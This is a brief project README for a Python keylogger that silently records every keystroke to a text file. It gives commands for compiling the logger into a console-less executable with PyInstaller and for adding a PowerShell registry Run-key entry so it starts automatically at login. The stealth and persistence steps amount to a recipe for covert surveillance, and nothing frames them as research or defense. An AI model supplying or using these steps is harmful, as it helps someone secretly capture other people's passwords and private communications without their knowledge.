# 💻Basic-KeyLogger

It's a basic KeyLogger in Python !

The PynPut library is needed but installed automatically at the launch of the KeyLogger with PIP.

He listen silently each key pressed in background and save logs in a TEXT file nammed "keylog.txt". Special Key are saved in this format : ```[Key.Esc]```

If you want to do a program on startup, you need to do an executable with the main script with ```PyInstaller```
To install PyInstaler : ```py -m pip install pyinstaller```
To convert in .EXE file : ```pyinstaller --noconsole main.py```

Now, you can add a key in the register key for do a program on startup with PowerShell : ```New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "main.exe" -Value "C:\path\to\the\main.exe" -PropertyType String -Force```


🛠 If you need help, you can contact me on [X (Twiter)](https://x.com.Nudryk) or on Discord : Cliik93200






